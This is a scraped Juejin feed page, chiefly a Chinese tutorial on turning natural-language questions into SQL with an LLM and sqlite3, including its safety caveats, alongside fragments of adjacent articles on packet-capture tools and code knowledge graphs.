



















<table><thead><tr><th>层级</th><th>工具</th><th>用途</th></tr></thead><tbody><tr><td>代理层</td><td>Charles / Proxyman / Fiddler</td><td>常规 HTTPS 调试</td></tr><tr><td>协议层</td><td>Wireshark / tcpdump</td><td>分析 TLS、QUIC、TCP</td></tr><tr><td>补抓层</td><td>抓包大师（Sniffmaster）</td><td>捕获底层数据流、解决 pinning/QUIC</td></tr></tbody></table>
<p>HTTPS Everywhere 下，抓包不是单一软件能完成的任务，而是一个完整的分层体系。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[当AI为你写SQL，连数据库都开始谈恋爱了]]></title>    <link>https://juejin.cn/post/7579872561674633225</link>    <guid>https://juejin.cn/post/7579872561674633225</guid>    <pubDate>2025-12-04T16:14:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579872561674633225" data-draft-id="7579785426267619328" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="当AI为你写SQL，连数据库都开始谈恋爱了 "/> <meta itemprop="keywords" content="人工智能,Python,SQL"/> <meta itemprop="datePublished" content="2025-12-04T16:14:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Qilana"/> <meta itemprop="url" content="https://juejin.cn/user/24668014656249"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            当AI为你写SQL，连数据库都开始谈恋爱了 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/24668014656249/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Qilana
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T16:14:51.000Z" title="Thu Dec 04 2025 16:14:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;color:rgba(46,36,36,.87);overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{margin-bottom:5px;font-size:30px;font-weight:500}.markdown-body h1:before{content:"#";margin-right:10px;color:#1976d2}.markdown-body h2{font-size:28px;font-weight:400;border-left:5px solid #454545;margin-top:20px;padding-left:10px;transition:all .3s ease-in-out}.markdown-body h2:hover{border-color:#1976d2}.markdown-body h3{font-size:24px;font-weight:400;margin-top:15px;padding-bottom:0}.markdown-body h4{font-size:20px;font-weight:500}.markdown-body h5{font-size:16px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h2:first-letter,.markdown-body h3:first-letter,.markdown-body p:first-letter{text-transform:capitalize}.markdown-body em{text-emphasis:dot;text-emphasis-position:under}.markdown-body img{display:block;margin:0 auto!important;max-width:100%;border-radius:2px;box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)!important}.markdown-body hr{position:relative;width:98%;height:1px;border:none;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,#ddd,#999,#ddd);overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background:#fff;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center}.markdown-body code{font-weight:900;word-break:break-word;border-radius:2px;overflow-x:auto;font-size:.87em;padding:.065em .4em;background-color:#fbe5e1;color:#c0341d}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:0 4px}.markdown-body pre&gt;code{font-weight:400;font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{margin:0 4px;text-decoration:none;color:#027fff;transition:all .3s ease-in-out;padding-bottom:4px;border-bottom:2px solid transparent}.markdown-body a:after{content:"";display:inline-block;width:18px;height:18px;margin-left:4px;vertical-align:middle;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiBzdHJva2U9IiMwMjdGRkYiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCI+PHBhdGggZD0iTTkuODE1IDYuNDQ4bDEuOTM2LTEuOTM2YzEuMzM3LTEuMzM2IDMuNTgtMS4yNTkgNS4wMTMuMTczIDEuNDMyIDEuNDMyIDEuNTEgMy42NzYuMTczIDUuMDEzbC0xLjQ1MiAxLjQ1Mi0uOTY4Ljk2OGMtMS4zMzcgMS4zMzYtMy41ODEgMS4yNTktNS4wMTMtLjE3MyIvPjxwYXRoIGQ9Ik0xMS4yNjcgMTUuMzY3bC0xLjkzNiAxLjkzNmMtMS4zMzYgMS4zMzctMy41OCAxLjI2LTUuMDEyLS4xNzMtMS40MzItMS40MzItMS41MS0zLjY3Ni0uMTczLTUuMDEybDEuNDUyLTEuNDUyLjk2OC0uOTY4YzEuMzM2LTEuMzM3IDMuNTgtMS4yNiA1LjAxMi4xNzMiLz48L2c+PC9zdmc+);background-size:cover;background-repeat:no-repeat}.markdown-body a:hover{border-color:#027fff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body a.footnote-backref:after,.markdown-body a.footnote-ref:after,.markdown-body sup a:after{display:none!important}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border:2px solid #c6c6c6}.markdown-body table img{box-shadow:none!important}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body del{color:rgba(0,0,0,.6)}.markdown-body blockquote{position:relative;color:#666;padding:5px 23px 1px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:hsla(0,0%,78.4%,.12);transition:all .2s ease-in-out}.markdown-body blockquote:hover{border-color:#1976d2}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;font-size:24px;font-weight:800;line-height:24px;color:#cbcbcb;opacity:.6}.markdown-body blockquote:before{content:"“";top:4px;left:6px}.markdown-body blockquote:after{content:"”";right:8px;bottom:-8px}.markdown-body blockquote&gt;p,.markdown-body blockquote blockquote{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body details{outline:none;border:none;border-left:4px solid #1976d2;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary:hover::-webkit-details-marker{color:#1976d2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>自然语言生成 SQL，就像恋人读懂你没说出口的需要。</strong><br/>
而今天，我们要从一行行真实的 Python 代码出发，看看这份“默契”是如何被构建出来的。</p>
</blockquote>
<h2 data-id="heading-0">🧠 背后的主角：一个会写 SQL 的 AI 助手</h2>
<p>在你的笔记本中，核心逻辑其实非常清晰——<br/>
<strong>用大模型（如 DeepSeek）将用户的自然语言问题，转化为可执行的 SQL 语句</strong>。</p>
<p>整个流程分为四步：</p>
<ol>
<li><strong>连接数据库，建表</strong></li>
<li><strong>提取表结构（Schema）作为上下文</strong></li>
<li><strong>构造 Prompt，调用 LLM</strong></li>
<li><strong>执行生成的 SQL，返回结果</strong></li>
</ol>
<p>这看似简单，却蕴含了现代 AI 应用的关键思想：<strong>上下文驱动 + 精准约束 + 安全执行</strong>。</p>
<h2 data-id="heading-1">🔌 第一步：轻量级数据库，快速验证想法</h2>
<p>你使用了 Python 内置的 <code>sqlite3</code> 模块，创建了一张员工表：</p>
<pre><code class="hljs language-python" lang="python">cursor.execute(<span class="hljs-string">"""
CREATE TABLE IF NOT EXISTS employees(
 id INTEGER PRIMARY KEY,
 name TEXT,
 department TEXT,
 salary INTEGER
)
"""</span>)
</code></pre>
<p>接着插入几条示例数据（虽然因主键冲突报错，但无伤大雅）：</p>
<pre><code class="hljs language-scss" lang="scss">sample_data = <span class="hljs-selector-attr">[ (6, <span class="hljs-string">"黄佳"</span>, <span class="hljs-string">"销售"</span>, 50000), (7, <span class="hljs-string">"宁宁"</span>, <span class="hljs-string">"工程"</span>, 75000), (8, <span class="hljs-string">"谦谦"</span>, <span class="hljs-string">"销售"</span>, 60000), (9, <span class="hljs-string">"悦悦"</span>, <span class="hljs-string">"工程"</span>, 80000), (10, <span class="hljs-string">"黄仁勋"</span>, <span class="hljs-string">"市场"</span>, 55000), (11, <span class="hljs-string">"杜经理"</span>, <span class="hljs-string">"工程"</span>, 80000)]</span>
<span class="hljs-attribute">cursor</span><span class="hljs-selector-class">.executemany</span>("INSERT INTO employees VALUES(?,?,?,?)", sample_data)
</code></pre>
<blockquote>
<p>💡 这体现了快速原型开发的精髓：<strong>用最轻量的方式验证核心逻辑</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">🗺️ 第二步：把“地图”交给 AI —— Schema 是关键！</h2>
<p>真正让 LLM 不瞎猜的，是你主动提供的 <strong>表结构信息</strong>：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">schema</span> = cursor.execute(<span class="hljs-string">"PRAGMA table_info(employees)"</span>).fetchall()
<span class="hljs-attr">schema_str</span> = <span class="hljs-string">"CREATE TABLE EMPLOYEES (\n"</span> + <span class="hljs-string">"\n"</span>.join([f<span class="hljs-string">"{col[1]} {col[2]}"</span> for col in schema]) + <span class="hljs-string">"\n)"</span>
</code></pre>
<p>输出结果为：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> EMPLOYEES (
id <span class="hljs-type">INTEGER</span>
name TEXT
department TEXT
salary <span class="hljs-type">INTEGER</span>
)
</code></pre>
<p>这一步至关重要！<br/>
没有 Schema，LLM 只能靠猜字段名（比如会不会叫 <code>dept</code> 而不是 <code>department</code>？），极易出错。<br/>
而有了它，AI 就像拿到了一张<strong>精准的数据地图</strong>，知道哪里是“姓名”，哪里是“部门”。</p>
<blockquote>
<p>✅ <strong>经验总结</strong>：Text-to-SQL 成功率 80% 取决于 Schema 提供是否完整清晰。</p>
</blockquote>
<h2 data-id="heading-3">💌 第三步：构造 Prompt —— 教 AI “好好说话”</h2>
<p>你设计的提示词非常克制而有效：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">prompt</span> = f<span class="hljs-string">"""
这是一个数据库的Schema:
{schema}
根据这个schema,请输出一个SQL查询，来回答以下问题：
只输出SQL查询语句本身，不要使用任何markdown格式，不要包含反引号、代码块标记或额外说明。
问题：{query}
"""</span>
</code></pre>
<p>并设置：</p>
<ul>
<li><code>temperature=0</code> → 确保输出确定、稳定</li>
<li><code>max_tokens=2048</code> → 防止截断</li>
<li><strong>明确禁止多余内容</strong> → 避免返回解释、注释或 Markdown</li>
</ul>
<p>为什么这么严格？<br/>
因为后续你要直接 <code>cursor.execute(sql)</code> ——<br/>
如果 AI 返回的是：</p>
<blockquote>
<p>“好的！以下是查询语句：\n<code>sql\nSELECT ...\n</code>”</p>
</blockquote>
<p>那程序就会崩溃！</p>
<blockquote>
<p>✅ <strong>最佳实践</strong>：对 LLM 的输出做<strong>格式强约束</strong>，是生产落地的前提。</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">🎯 实战演示：从“人话”到“机器语”</h2>
<h3 data-id="heading-5">场景一：查询</h3>
<blockquote>
<p>用户问：“工程部门员工的姓名和工资是多少？”</p>
</blockquote>
<p>AI 输出：</p>
<pre><code class="hljs language-ini" lang="ini">SELECT name, salary FROM EMPLOYEES WHERE <span class="hljs-attr">department</span> = <span class="hljs-string">'工程'</span><span class="hljs-comment">;</span>
</code></pre>
<p>执行结果：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[(<span class="hljs-string">'宁宁'</span>, 75000), (<span class="hljs-string">'悦悦'</span>, 80000), (<span class="hljs-string">'杜经理'</span>, 80000)]</span>
</code></pre>
<p>✅ 完美匹配中文语义，且字段、表名大小写一致（注意你用了 <code>EMPLOYEES</code> 全大写，SQLite 不敏感，但好习惯值得保持）。</p>
<hr/>
<h3 data-id="heading-6">场景二：插入</h3>
<blockquote>
<p>用户说：“在销售部门增加一个新员工，姓名为张三，工资为45000”</p>
</blockquote>
<p>AI 输出：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> EMPLOYEES (name, department, salary) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'张三'</span>, <span class="hljs-string">'销售'</span>, <span class="hljs-number">45000</span>);
</code></pre>
<p>注意：<strong>它自动省略了 <code>id</code> 字段</strong>！<br/>
因为你在建表时设了 <code>id INTEGER PRIMARY KEY</code>，SQLite 会自动递增。<br/>
这说明 LLM <strong>理解主键自增语义</strong>，非常聪明。</p>
<hr/>
<h3 data-id="heading-7">场景三：删除</h3>
<blockquote>
<p>用户指令：“删除市场部门的黄仁勋”</p>
</blockquote>
<p>AI 输出：</p>
<pre><code class="hljs language-ini" lang="ini">DELETE FROM EMPLOYEES WHERE <span class="hljs-attr">department</span> = <span class="hljs-string">'市场'</span> AND name = <span class="hljs-string">'黄仁勋'</span><span class="hljs-comment">;</span>
</code></pre>
<p>✅ 条件完整，避免误删。<br/>
但如果用户说“删掉黄仁勋”，没提部门，就可能误删重名者——<br/>
这提醒我们：<strong>业务语义需足够明确，或系统应主动澄清</strong>。</p>
<hr/>
<h2 data-id="heading-8">⚠️ 安全反思：不能盲目信任生成结果</h2>
<p>尽管 Demo 很美好，但真实场景必须考虑：</p>

























<table><thead><tr><th>风险</th><th>你的代码现状</th><th>建议改进</th></tr></thead><tbody><tr><td>执行任意 SQL</td><td>直接 <code>cursor.execute(sql_query)</code></td><td>加入 SQL 白名单（如只允许 <code>SELECT</code>）</td></tr><tr><td>表名/字段注入</td><td>依赖 LLM 输出</td><td>用正则校验是否只含字母、数字、下划线</td></tr><tr><td>无 WHERE 删除</td><td>当前示例有 WHERE</td><td>强制校验 <code>DELETE/UPDATE</code> 必须带条件</td></tr></tbody></table>
<blockquote>
<p>🔒 <strong>记住</strong>：Demo 可以浪漫，生产必须严谨。</p>
</blockquote>
<hr/>
<h2 data-id="heading-9">🌱 延伸思考：如何融入 MVC 架构？</h2>
<p>正如理念所倡导的 <strong>AI First + Mobile First + MVC</strong>，你可以这样扩展：</p>
<ul>
<li><strong>Model</strong>：封装数据库操作，提供 <code>query_by_natural_language(text)</code> 方法</li>
<li><strong>View</strong>：移动端聊天界面，输入框 + 结果卡片</li>
<li><strong>Controller</strong>：接收用户消息 → 调用 AI 生成 SQL → 执行 → 返回结构化数据</li>
</ul>
<p>未来甚至可加入：</p>
<ul>
<li>多轮对话（“刚才那个工程部的人，再查下他的入职时间”）</li>
<li>权限控制（销售只能查销售部数据）</li>
<li>自然语言转可视化图表（“画个柱状图”）</li>
</ul>
<hr/>
<h2 data-id="heading-10">✨ 结语：技术的温度，在于“理解”而非“执行”</h2>
<p>回到开头那句话：</p>
<blockquote>
<p>你说“我想知道上个月谁最常买我们的花。”<br/>
TA 默默写下 SQL，为你打捞答案。</p>
</blockquote>
<p>而在这份代码中，我们看到的不仅是 <code>OpenAI</code> 客户端、<code>sqlite3</code> 游标、<code>executemany</code>，<br/>
更是一种<strong>以人为本的设计哲学</strong>：</p>
<ul>
<li>给 AI 足够上下文（Schema）</li>
<li>约束输出格式（纯 SQL）</li>
<li>安全执行结果（commit / fetchall）</li>
</ul>
<p><strong>真正的智能，不是炫技，而是让非技术人员也能平等地使用数据。</strong></p>
<p>而这，或许就是下一代应用的起点。</p>
<hr/>
<p>📬 <strong>现在，轮到你了</strong>：<br/>
试着改写 <code>ask_deepseek</code> 函数，让它支持多表关联，或者自动处理日期范围（如“上个月” → <code>BETWEEN '2025-11-01' AND '2025-11-30'</code>）。<br/>
你会发现，<strong>AI 是笔，你是诗人</strong>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[构建企业级代码知识图谱系统：从理论到实践]]></title>    <link>https://juejin.cn/post/7579659550863114282</link>    <guid>https://juejin.cn/post/7579659550863114282</guid>    <pubDate>2025-12-04T16:36:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579659550863114282" data-draft-id="7579846685070966838" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="构建企业级代码知识图谱系统：从理论到实践"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-12-04T16:36:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="www769"/> <meta itemprop="url" content="https://juejin.cn/user/1656332880187112"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            构建企业级代码知识图谱系统：从理论到实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1656332880187112/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    www769
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T16:36:17.000Z" title="Thu Dec 04 2025 16:36:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 